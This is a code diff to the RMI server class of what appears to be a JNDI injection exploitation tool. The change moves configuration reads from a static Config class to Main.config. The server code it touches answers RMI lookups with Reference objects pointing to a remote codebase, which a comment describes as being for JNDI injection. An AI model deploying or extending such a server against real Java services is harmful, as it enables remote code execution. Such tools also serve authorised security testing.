@@ -1,6 +1,6 @@
 package map.jndi.server;
 
-import map.jndi.Config;
+import map.jndi.Main;
 import map.jndi.Dispatcher;
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import sun.rmi.server.UnicastServerRef;
@@ -233,7 +233,7 @@ public class RMIServer implements Runnable {
         System.out.println("[RMI] Is RMI.lookup call for " + object + " " + method);
 
         out.writeByte(TransportConstants.Return);// transport op
-        try (ObjectOutputStream oos = new MarshalOutputStream(out, Config.codebase)) {
+        try (ObjectOutputStream oos = new MarshalOutputStream(out, Main.config.codebase)) {
 
             oos.writeByte(TransportConstants.NormalReturn);
             new UID().write(oos);
@@ -245,8 +245,8 @@ public class RMIServer implements Runnable {
             // 路由分发, 为其匹配对应的 Controller 和方法
             Object result;
 
-            if (Config.url != null) {
-                result = Dispatcher.getInstance().service(Config.url);
+            if (Main.config.url != null) {
+                result = Dispatcher.getInstance().service(Main.config.url);
             } else {
                 result = Dispatcher.getInstance().service(path);
             }
@@ -258,7 +258,7 @@ public class RMIServer implements Runnable {
                 wrapper = new ReferenceWrapper((Reference) result);
             } else {
                 // 返回 Reference 对象, 指定 codebase, 用于常规 JNDI 注入
-                Reference ref = new Reference("foo", (String) result, Config.codebase);
+                Reference ref = new Reference("foo", (String) result, Main.config.codebase);
                 wrapper = new ReferenceWrapper(ref);
             }
 
